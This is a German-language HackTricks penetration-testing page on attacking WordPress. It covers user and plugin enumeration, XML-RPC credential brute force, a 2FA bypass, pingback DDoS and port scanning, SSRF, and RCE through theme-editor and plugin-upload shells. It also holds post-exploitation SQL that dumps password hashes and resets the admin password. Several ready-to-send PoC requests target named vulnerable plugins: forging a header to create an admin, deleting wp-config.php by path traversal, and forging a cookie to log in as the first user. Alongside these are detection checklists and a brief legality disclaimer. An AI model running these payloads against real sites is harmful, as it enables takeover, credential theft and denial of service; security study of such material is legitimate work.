# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

- **Hochgeladene** Dateien landen unter: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Theme-Dateien befinden sich in /wp-content/themes/,** daher, wenn du etwas PHP des Themes √§nderst, um RCE zu bekommen, wirst du wahrscheinlich diesen Pfad verwenden. Zum Beispiel: Beim Verwenden des **theme twentytwelve** kannst du die **404.php** Datei erreichen unter: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Eine weitere n√ºtzliche URL k√∂nnte sein:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** kannst du das Root-Passwort der Datenbank finden.
- Standard-Login-Pfade zum √úberpr√ºfen: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Haupt-WordPress-Dateien**

- `index.php`
- `license.txt` enth√§lt n√ºtzliche Informationen wie die installierte WordPress-Version.
- `wp-activate.php` wird f√ºr den E-Mail-Aktivierungsprozess bei der Einrichtung einer neuen WordPress-Seite verwendet.
- Login-Ordner (k√∂nnen umbenannt sein, um sie zu verstecken):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ist eine Datei, die eine Funktion von WordPress darstellt, die das √úbertragen von Daten mit HTTP als Transportmechanismus und XML als Kodierungsmechanismus erm√∂glicht. Diese Art der Kommunikation wurde durch die WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ersetzt.
- Der Ordner `wp-content` ist das Hauptverzeichnis, in dem Plugins und Themes gespeichert werden.
- `wp-content/uploads/` ist das Verzeichnis, in dem alle auf die Plattform hochgeladenen Dateien gespeichert werden.
- `wp-includes/` Dies ist das Verzeichnis, in dem Core-Dateien gespeichert sind, wie Zertifikate, Schriftarten, JavaScript-Dateien und Widgets.
- `wp-sitemap.xml` In WordPress-Versionen 5.5 und h√∂her generiert WordPress eine sitemap XML-Datei mit allen √∂ffentlichen Posts und √∂ffentlich abfragbaren Post-Typen und Taxonomien.

**Post exploitation**

- Die Datei `wp-config.php` enth√§lt Informationen, die WordPress ben√∂tigt, um eine Verbindung zur Datenbank herzustellen, wie den Datenbanknamen, Datenbankhost, Benutzername und Passwort, Authentifizierungs-Keys und Salts sowie das Pr√§fix der Datenbanktabellen. Diese Konfigurationsdatei kann auch verwendet werden, um den DEBUG-Modus zu aktivieren, was bei der Fehlersuche n√ºtzlich sein kann.

### Benutzerberechtigungen

- **Administrator**
- **Editor**: Ver√∂ffentlicht und verwaltet seine und andere Beitr√§ge
- **Author**: Ver√∂ffentlicht und verwaltet seine eigenen Beitr√§ge
- **Contributor**: Schreibt und verwaltet seine Beitr√§ge, kann sie aber nicht ver√∂ffentlichen
- **Subscriber**: Durchsucht Beitr√§ge und bearbeitet sein Profil

## **Passive Aufkl√§rung**

### **WordPress-Version herausfinden**

√úberpr√ºfe, ob du die Dateien `/license.txt` oder `/readme.html` finden kannst

Innerhalb des **source code** der Seite (Beispiel von [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS-Link-Dateien

![](<../../images/image (533).png>)

- JavaScript-Dateien

![](<../../images/image (524).png>)

### Plugins herunterladen
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Themes abrufen
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Versionen allgemein extrahieren
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

Du wirst wahrscheinlich nicht in der Lage sein, alle m√∂glichen Plugins und Themes zu finden. Um alle zu entdecken, musst du **aktiv per Brute Force eine Liste von Plugins und Themes** erstellen (hoffentlich gibt es f√ºr uns automatisierte Tools, die diese Listen enthalten).

### Benutzer

- **ID Brute:** Du erh√§ltst g√ºltige Benutzer von einer WordPress-Seite durch Brute Forcing der Benutzer-IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Wenn die Antworten **200** oder **30X** sind, bedeutet das, dass die id **g√ºltig** ist. Wenn die Antwort **400** ist, dann ist die id **ung√ºltig**.

- **wp-json:** Du kannst auch versuchen, Informationen √ºber die Benutzer zu erhalten, indem du abfragst:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ein weiterer `/wp-json/` endpoint, der einige Informationen √ºber Benutzer preisgeben kann, ist:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Beachte, dass dieser Endpoint nur Benutzer offenlegt, die einen Beitrag ver√∂ffentlicht haben. **Es werden nur Informationen √ºber Benutzer bereitgestellt, die diese Funktion aktiviert haben**.

Beachte au√üerdem, dass **/wp-json/wp/v2/pages** IP-Adressen leak.

- **Login username enumeration**: Beim Einloggen in **`/wp-login.php`** ist die **Meldung** **anders**, je nachdem, ob der **Benutzername existiert oder nicht**.

### XML-RPC

Wenn `xml-rpc.php` aktiv ist, kannst du eine credentials brute-force durchf√ºhren oder es verwenden, um DoS-Angriffe auf andere Ressourcen zu starten. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Um zu pr√ºfen, ob es aktiv ist, versuche, auf _**/xmlrpc.php**_ zuzugreifen und diese Anfrage zu senden:

**√úberpr√ºfen**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** oder **`metaWeblog.getUsersBlogs`** sind einige der Methoden, die verwendet werden k√∂nnen, um Credentials zu brute-force. Wenn Sie eines davon finden, k√∂nnen Sie etwas wie Folgendes senden:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Die Meldung _"Incorrect username or password"_ innerhalb einer HTTP-200-Antwort sollte erscheinen, wenn die Zugangsdaten nicht g√ºltig sind.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Mit den korrekten Zugangsdaten k√∂nnen Sie eine Datei hochladen. In der Antwort wird der Pfad angezeigt ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Au√üerdem gibt es einen **schnelleren Weg**, um brute-force credentials mit **`system.multicall`** durchzuf√ºhren, da du mehrere credentials in derselben Anfrage ausprobieren kannst:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Diese Methode ist f√ºr Programme gedacht und nicht f√ºr Menschen und ist alt; daher unterst√ºtzt sie 2FA nicht. Wenn du also g√ºltige creds hast, aber der Haupteingang durch 2FA gesch√ºtzt ist, **kannst du xmlrpc.php missbrauchen, um dich mit diesen creds einzuloggen und 2FA zu umgehen**. Beachte, dass du nicht alle Aktionen ausf√ºhren kannst, die √ºber die Konsole m√∂glich sind, aber du k√∂nntest trotzdem RCE erreichen, wie Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) erkl√§rt.

**DDoS oder port scanning**

Wenn du die Methode _**pingback.ping**_ in der Liste findest, kannst du Wordpress dazu bringen, eine beliebige Anfrage an einen beliebigen host/port zu senden.\
Dies kann verwendet werden, um **Tausende** von Wordpress **Websites** anzuweisen, auf einen **Ort** zu **zugreifen** (wodurch an diesem Ort ein **DDoS** verursacht wird) oder du kannst es nutzen, um **Wordpress** ein internes **Netzwerk** scannen zu lassen (du kannst jeden Port angeben).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Wenn du **faultCode** mit einem Wert **gr√∂√üer** als **0** (17) erh√§ltst, bedeutet das, dass der Port offen ist.

Sieh dir die Verwendung von **`system.multicall`** im vorherigen Abschnitt an, um zu lernen, wie man diese Methode missbraucht, um DDoS zu verursachen.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Diese Datei befindet sich normalerweise im Stammverzeichnis der Wordpress-Seite: **`/wp-cron.php`**\
Wenn diese Datei **aufgerufen** wird, wird eine ressourcenintensive MySQL **Abfrage** ausgef√ºhrt, sodass sie von **Angreifern** dazu verwendet werden kann, einen **DoS** zu verursachen.\
Au√üerdem wird standardm√§√üig die `wp-cron.php` bei jedem Seitenaufruf (immer wenn ein Client irgendeine Wordpress-Seite anfordert) ausgef√ºhrt, was auf stark frequentierten Seiten Probleme (DoS) verursachen kann.

Es wird empfohlen, Wp-Cron zu deaktivieren und stattdessen einen echten cronjob auf dem Host zu erstellen, der die ben√∂tigten Aktionen in regelm√§√üigen Abst√§nden ausf√ºhrt (ohne Probleme zu verursachen).

### /wp-json/oembed/1.0/proxy - SSRF

Versuche, _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ aufzurufen, und die Worpress-Seite k√∂nnte eine Anfrage an dich senden.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Dieses Tool pr√ºft, ob der **methodName: pingback.ping** vorhanden ist und ob der Pfad **/wp-json/oembed/1.0/proxy** existiert; falls ja, versucht es, diese auszunutzen.

## Automatische Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Zugriff durch √úberschreiben eines Bits

Mehr als ein echter Angriff ist das eher eine Kuriosit√§t. Im CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) konnte man 1 Bit in jeder wordpress-Datei umschalten. Dadurch konnte man an Position `5389` der Datei `/var/www/html/wp-includes/user.php` die NOT-Operation (`!`) in ein NOP verwandeln.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Eine php-Datei des verwendeten Themes √§ndern (Admin-Zugangsdaten ben√∂tigt)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (rechts)

Den Inhalt durch eine php-Shell ersetzen:

![](<../../images/image (384).png>)

Suche im Internet, wie du auf die aktualisierte Seite zugreifen kannst. In diesem Fall musst du hier zugreifen: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Du kannst verwenden:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
um eine Session zu bekommen.

## Plugin RCE

### PHP plugin

Es kann m√∂glich sein, .php-Dateien als Plugin hochzuladen.\
Erstelle deine php-Backdoor zum Beispiel mit:

![](<../../images/image (183).png>)

F√ºge dann ein neues Plugin hinzu:

![](<../../images/image (722).png>)

Plugin hochladen und auf Install Now klicken:

![](<../../images/image (249).png>)

Klicke auf Procced:

![](<../../images/image (70).png>)

Wahrscheinlich wird scheinbar nichts passieren, aber wenn du zu Media gehst, siehst du deine hochgeladene shell:

![](<../../images/image (462).png>)

√ñffne sie und du wirst die URL sehen, um die reverse shell auszuf√ºhren:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Diese Methode beinhaltet die Installation eines bekannten verwundbaren und ausnutzbaren b√∂sartigen Plugins, um eine web shell zu erhalten. Dieser Vorgang wird √ºber das WordPress dashboard wie folgt durchgef√ºhrt:

1. **Plugin Acquisition**: Das Plugin wird aus einer Quelle wie Exploit DB bezogen, z. B. [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigiere zum WordPress dashboard, dann zu `Dashboard > Plugins > Upload Plugin`.
- Lade die Zip-Datei des heruntergeladenen Plugins hoch.
3. **Plugin Activation**: Sobald das Plugin erfolgreich installiert ist, muss es √ºber das Dashboard aktiviert werden.
4. **Exploitation**:
- Mit installiertem und aktiviertem Plugin "reflex-gallery" kann dieses ausgenutzt werden, da es als verwundbar bekannt ist.
- Das Metasploit framework bietet einen Exploit f√ºr diese Verwundbarkeit. Durch Laden des passenden Moduls und Ausf√ºhren spezifischer Befehle kann eine meterpreter-Session hergestellt werden, die unbefugten Zugriff auf die Seite erm√∂glicht.
- Dies ist nur eine von vielen Methoden, um eine WordPress-Seite auszunutzen.

Der Inhalt enth√§lt visuelle Hilfen, die die Schritte im WordPress dashboard zum Installieren und Aktivieren des Plugins zeigen. Es ist jedoch wichtig zu beachten, dass das Ausnutzen von Verwundbarkeiten auf diese Weise ohne ausdr√ºckliche Genehmigung illegal und unethisch ist. Diese Informationen sollten verantwortungsvoll und nur in einem legalen Kontext verwendet werden, z. B. bei Penetrationstests mit ausdr√ºcklicher Erlaubnis.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ist ein Script, das dazu entwickelt wurde, eine **Cross-Site Scripting (XSS)**-Vulnerability zu **Remote Code Execution (RCE)** oder anderen kritischen Verwundbarkeiten in WordPress zu eskalieren. F√ºr mehr Informationen siehe [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Es bietet **Support f√ºr Wordpress Versions 6.X.X, 5.X.X und 4.X.X und erlaubt:**
- _**Privilege Escalation:**_ Erstellt einen User in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ L√§dt dein custom Plugin (Backdoor) in WordPress hoch.
- _**(RCE) Built-In Plugin Edit:**_ Editiert eingebaute Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Editiert eingebaute Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits f√ºr Third-Party WordPress Plugins/Themes.

## Post Exploitation

Benutzernamen und Passw√∂rter extrahieren:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin-Passwort √§ndern:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Angriffsfl√§che

Zu wissen, wie ein Wordpress-Plugin Funktionalit√§t nach au√üen legt, ist entscheidend, um Schwachstellen in dieser Funktionalit√§t zu finden. Sie k√∂nnen sehen, wie ein Plugin Funktionalit√§t exponieren kann, in den folgenden Aufz√§hlungspunkten und einige Beispiele verwundbarer Plugins in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Eine M√∂glichkeit, wie ein Plugin Funktionen f√ºr Benutzer offenlegt, sind AJAX-Handler. Diese k√∂nnen Logik-, Autorisierungs- oder Authentifizierungsfehler enthalten. Au√üerdem ist es ziemlich h√§ufig, dass diese Funktionen sowohl die Authentifizierung als auch die Autorisierung auf das Vorhandensein eines Wordpress-Nonce st√ºtzen, das **jeder im Wordpress-System authentifizierte Benutzer haben k√∂nnte** (unabh√§ngig von seiner Rolle).

Dies sind die Funktionen, die verwendet werden k√∂nnen, um eine Funktion in einem Plugin offenzulegen:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Die Verwendung von `nopriv` macht den Endpoint f√ºr alle Benutzer zug√§nglich (auch f√ºr nicht authentifizierte).**

> [!CAUTION]
> Au√üerdem, wenn die Funktion die Autorisierung des Benutzers nur mit der Funktion `wp_verify_nonce` pr√ºft, stellt diese nur fest, dass der Benutzer eingeloggt ist; sie pr√ºft normalerweise nicht die Rolle des Benutzers. Daher k√∂nnten Benutzer mit niedrigen Rechten Zugriff auf Aktionen mit hohen Rechten erhalten.

- **REST API**

Es ist auch m√∂glich, Funktionen von wordpress offenzulegen, indem man eine REST API mit der Funktion `register_rest_route` registriert:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Die `permission_callback` ist eine Callback-Funktion, die pr√ºft, ob ein bestimmter Benutzer berechtigt ist, die API-Methode aufzurufen.

**Wenn die eingebaute Funktion `__return_true` verwendet wird, √ºberspringt sie einfach die Benutzerberechtigungspr√ºfung.**

- **Direkter Zugriff auf die php-Datei**

Nat√ºrlich verwendet Wordpress PHP und Dateien innerhalb von Plugins sind direkt √ºber das Web zug√§nglich. Wenn also ein Plugin eine verwundbare Funktionalit√§t bereitstellt, die allein durch den Zugriff auf die Datei ausgel√∂st wird, kann sie von jedem Benutzer ausgenutzt werden.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Einige Plugins implementieren ‚Äûtrusted header‚Äú-Shortcuts f√ºr interne Integrationen oder reverse proxies und verwenden dann diesen Header, um den aktuellen Benutzerkontext f√ºr REST-Anfragen zu setzen. Wenn der Header nicht kryptografisch an die Anfrage durch eine upstream component gebunden ist, kann ein Angreifer ihn f√§lschen und privilegierte REST-Routen als Administrator ansprechen.

- Auswirkung: unauthenticated privilege escalation to admin durch die Erstellung eines neuen Administrators √ºber die core users REST route.
- Beispiel-Header: `X-Wcpay-Platform-Checkout-User: 1` (erzwingt User-ID 1, typischerweise das erste Administrator-Konto).
- Ausgenutzte Route: `POST /wp-json/wp/v2/users` mit einem elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Warum es funktioniert

- Das Plugin mappt einen vom Client kontrollierten Header auf den Authentifizierungsstatus und √ºberspringt Berechtigungspr√ºfungen.
- Der WordPress-Core erwartet die `create_users`-Capability f√ºr diese Route; der Plugin-Hack umgeht dies, indem er den aktuellen Benutzerkontext direkt aus dem Header setzt.

Erwartete Erfolgshinweise

- HTTP 201 mit einem JSON-Body, der den erstellten Benutzer beschreibt.
- Ein neuer Admin-Benutzer sichtbar in `wp-admin/users.php`.

Erkennungs-Checkliste

- Grep nach `getallheaders()`, `$_SERVER['HTTP_...']`, oder vendor SDKs, die benutzerdefinierte Header lesen, um den Benutzerkontext zu setzen (z. B. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- √úberpr√ºfe REST-Registrierungen auf privilegierte Callbacks, die keine robusten `permission_callback`-Pr√ºfungen haben und stattdessen auf Request-Header vertrauen.
- Suche nach Verwendungen von Core-User-Management-Funktionen (`wp_insert_user`, `wp_create_user`) in REST-Handlern, die nur durch Header-Werte gesch√ºtzt sind.

### Nicht authentifizierte beliebige Dateil√∂schung √ºber wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress-Themes und -Plugins machen h√§ufig AJAX-Handler √ºber die Hooks `wp_ajax_` und `wp_ajax_nopriv_` verf√ºgbar.  Wenn die **_nopriv_**-Variante verwendet wird **ist der Callback f√ºr nicht authentifizierte Besucher erreichbar**, daher muss jede sensible Aktion zus√§tzlich implementieren:

1. Eine **Capability-Pr√ºfung** (z. B. `current_user_can()` oder zumindest `is_user_logged_in()`), und
2. Eine **CSRF-Nonce** validiert mit `check_ajax_referer()` / `wp_verify_nonce()`, und
3. **Strikte Eingabesanitisierung / -validierung**.

Das Litho-Multipurpose-Theme (< 3.1) hat diese 3 Kontrollen in der *Remove Font Family* Funktion vergessen und lieferte schlie√ülich den folgenden Code (vereinfacht):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Nicht authentifizierter Zugriff** ‚Äì the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** ‚Äì jeder Besucher kann den Endpunkt aufrufen.
* **No path sanitisation** ‚Äì der vom Benutzer kontrollierte `fontfamily`-String wird ohne Filter an einen Dateisystempfad angeh√§ngt, was klassisches `../../` Traversal erm√∂glicht.

#### Exploitation

Ein Angreifer kann jede Datei oder jedes Verzeichnis **unterhalb des uploads-Stammverzeichnisses** (normally `<wp-root>/wp-content/uploads/`) indem er eine einzelne HTTP POST-Anfrage sendet:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Weil `wp-config.php` au√üerhalb von *uploads* liegt, reichen auf einer Standardinstallation vier `../`-Sequenzen. Das L√∂schen von `wp-config.php` zwingt WordPress beim n√§chsten Besuch in den *Installation Wizard*, wodurch eine vollst√§ndige √úbernahme der Seite m√∂glich wird (der Angreifer liefert lediglich eine neue DB-Konfiguration und erstellt einen Admin-Benutzer).

Andere wirkungsvolle Ziele umfassen plugin/theme `.php` files (um Sicherheits-Plugins zu umgehen) oder `.htaccess`-Regeln.

#### Erkennungs-Checkliste

* Jede `add_action( 'wp_ajax_nopriv_...')` Callback-Funktion, die Dateisystem-Helfer (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.) aufruft.
* Konkatenation unsanitierter Benutzereingaben in Pfaden (nach `$_POST`, `$_GET`, `$_REQUEST` suchen).
* Fehlendes `check_ajax_referer()` und `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Viele Plugins implementieren eine "view as role" oder tempor√§re Rollenwechsel-Funktion, indem sie die urspr√ºnglichen Rolle(n) in user meta speichern, damit sie sp√§ter wiederhergestellt werden k√∂nnen. Wenn der Wiederherstellungspfad ausschlie√ülich auf Request-Parametern (z.B. `$_REQUEST['reset-for']`) und einer vom Plugin verwalteten Liste beruht, ohne Capabilities und ein g√ºltiges Nonce zu pr√ºfen, f√ºhrt das zu einer vertical privilege escalation.

Ein reales Beispiel wurde im Admin and Site Enhancements (ASE) Plugin (‚â§ 7.6.2.1) gefunden. Der Reset-Zweig stellte Rollen basierend auf `reset-for=<username>` wieder her, wenn der Benutzername in einem internen Array `$options['viewing_admin_as_role_are']` erschien, f√ºhrte jedoch weder einen `current_user_can()`-Check noch eine Nonce-Verifizierung durch, bevor die aktuellen Rollen entfernt und die in user meta `_asenha_view_admin_as_original_roles` gespeicherten Rollen erneut hinzugef√ºgt wurden:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Warum es ausnutzbar ist

- Vertraut `$_REQUEST['reset-for']` und einer Plugin-Option ohne serverseitige Autorisierung.
- Wenn ein Benutzer zuvor h√∂here Privilegien in `_asenha_view_admin_as_original_roles` gespeichert hatte und herabgestuft wurde, kann er diese wiederherstellen, indem er den Reset-Pfad aufruft.
- In manchen Deployments konnte jeder authentifizierte Benutzer einen Reset f√ºr einen anderen Benutzernamen ausl√∂sen, der noch in `viewing_admin_as_role_are` vorhanden ist (fehlerhafte Autorisierung).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Auf verwundbaren Builds entfernt dies die aktuellen Rollen und f√ºgt die gespeicherten urspr√ºnglichen Rollen (z. B. `administrator`) wieder hinzu, wodurch effektiv Privilegien eskaliert werden.

Detection checklist

- Achte auf role-switching-Features, die ‚Äúoriginal roles‚Äù in user meta persistieren (z. B. `_asenha_view_admin_as_original_roles`).
- Identifiziere Reset-/Restore-Pfade, die:
- Lese Benutzernamen aus `$_REQUEST` / `$_GET` / `$_POST`.
- √Ñndere Rollen via `add_role()` / `remove_role()` ohne `current_user_can()` und `wp_verify_nonce()` / `check_admin_referer()`.
- Authorisiere basierend auf einem Plugin-Options-Array (z. B. `viewing_admin_as_role_are`) statt auf den F√§higkeiten des Akteurs.

---

### Nicht authentifizierte Privilegieneskalation durch cookie‚Äëvertrauensw√ºrdiges User-Switching am √∂ffentlichen init (Service Finder ‚Äúsf-booking‚Äù)

Einige Plugins h√§ngen user-switching-Hilfsfunktionen an den √∂ffentlichen `init`-Hook und leiten die Identit√§t aus einem vom Client kontrollierten Cookie ab. Ruft der Code `wp_set_auth_cookie()` auf, ohne Authentifizierung, capability und ein g√ºltiges nonce zu pr√ºfen, kann jeder nicht authentifizierte Besucher eine Anmeldung als beliebige Benutzer-ID erzwingen.

Typisches verwundbares Muster (vereinfacht aus Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Warum es ausnutzbar ist

- √ñffentlicher `init` Hook macht den Handler f√ºr nicht authentifizierte Benutzer erreichbar (kein `is_user_logged_in()`-Schutz).
- Die Identit√§t wird aus einem vom Client ver√§nderbaren Cookie (`original_user_id`) abgeleitet.
- Ein direkter Aufruf von `wp_set_auth_cookie($uid)` meldet den Anfragenden als diesen Benutzer an, ohne Capability-/Nonce-Pr√ºfungen.

Ausnutzung (nicht authentifiziert)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF-√úberlegungen f√ºr WordPress-/Plugin-CVEs

Generische Edge-/Server-WAFs sind auf breite Muster (SQLi, XSS, LFI) ausgelegt. Viele hochkritische WordPress-/Plugin-Schwachstellen sind anwendungsspezifische Logik-/auth-Bugs, die wie harmloser Traffic aussehen, sofern die Engine nicht WordPress-Routen und Plugin-Semantik versteht.

Offensive Hinweise

- Ziele plugin-spezifische Endpunkte mit sauberen payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Teste zuerst unauth-Pfade (AJAX `nopriv`, REST mit permissivem `permission_callback`, √∂ffentliche shortcodes). Default payloads gelingen oft ohne obfuscation.
